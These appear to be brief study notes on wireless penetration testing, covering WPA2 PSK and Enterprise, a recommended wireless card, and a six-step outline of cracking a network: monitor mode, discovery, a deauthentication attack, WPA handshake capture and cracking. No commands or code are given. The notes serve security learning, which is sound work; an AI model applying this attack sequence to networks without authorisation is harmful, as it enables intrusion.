Assessment of wireless network :
WPA2 PSK - small business
WPA2 Enterprise - large business

OSTP Certification - teach about wireless certification

Evaluting strength of PSK 
Reviewing nearby networks
Assessing guest networks
checking network access

Alfa AWUD036NH - wireless cards

You want the WC to proceed the attack

The Hacking Process:

Place - Place wireless card into monitor mode
Discover - Discover Info about network
Select - select network and capture data
Perform - Perform deauth attack
Capture - capture WPA handshake
Attempt - Attempt to crack the handshake
